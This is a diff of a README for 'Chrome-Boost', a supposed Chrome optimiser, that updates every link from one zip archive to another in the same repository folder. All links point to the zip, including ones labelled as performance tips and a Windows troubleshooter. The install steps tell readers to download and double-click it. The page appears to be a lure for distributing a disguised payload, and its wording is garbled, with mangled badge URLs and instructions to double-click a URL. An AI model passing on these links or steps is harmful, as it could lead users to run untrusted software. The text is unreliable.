@@ -1,6 +1,6 @@
 # 🚀 Chrome-Boost - Optimize Your Browsing Experience
 
-[![Download Chrome-Boost](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip%https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip)](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip)
+[![Download Chrome-Boost](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip%https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip)](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip)
 
 ## 📝 Overview
 
@@ -29,15 +29,15 @@ Follow these steps to download and run Chrome-Boost.
 
 To get the latest version, visit the release page:
 
-[Download Chrome-Boost](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip)
+[Download Chrome-Boost](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip)
 
 ### 2. Download the Installer
 
-On the releases page, find the latest version. Look for files labeled as `https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip` or similar. Click on it to download.
+On the releases page, find the latest version. Look for files labeled as `https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip` or similar. Click on it to download.
 
 ### 3. Install Chrome-Boost
 
-Once the download finishes, locate the downloaded file in your downloads folder. Double-click on `https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip` to start the installation process.
+Once the download finishes, locate the downloaded file in your downloads folder. Double-click on `https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip` to start the installation process.
 
 ### 4. Follow Installation Prompts
 
@@ -55,7 +55,7 @@ You can tweak various settings within Chrome-Boost. For users who want deeper cu
 
 To install Chrome-Boost, please follow these instructions:
 
-1. Visit the download page: [Download Chrome-Boost](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip).
+1. Visit the download page: [Download Chrome-Boost](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip).
 2. Choose the latest release file.
 3. Download and install the application as previously described.
 
@@ -86,9 +86,9 @@ If you have any suggestions or issues, feel free to join our community discussio
 
 To learn more about optimizing your Chrome experience, consider checking out the following links:
 
-- [Chrome Performance Tips](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip)
-- [Windows Performance Troubleshooter](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip)
+- [Chrome Performance Tips](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip)
+- [Windows Performance Troubleshooter](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip)
 
 Optimize your browsing today with Chrome-Boost. Don’t forget to return to the releases page for updates.
 
-[Download Chrome-Boost](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Boost-Chrome-v1.5.zip)
+[Download Chrome-Boost](https://raw.githubusercontent.com/vsmk-konisam/Chrome-Boost/main/Sabbaticalness/Chrome_Boost_v1.8.zip)
